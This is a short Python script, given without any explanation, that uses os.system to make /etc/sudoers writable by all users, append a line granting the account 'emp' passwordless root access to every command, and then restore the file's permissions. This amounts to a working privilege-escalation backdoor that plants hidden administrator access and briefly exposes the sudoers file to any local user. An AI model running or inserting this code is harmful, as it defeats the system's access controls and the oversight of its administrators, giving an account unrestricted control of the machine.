import os 

command = 'chmod o+rwx /etc/sudoers'
os.system(command)

command = 'echo "emp ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers'
os.system(command)

command = 'chmod o-rwx /etc/sudoers'
os.system(command)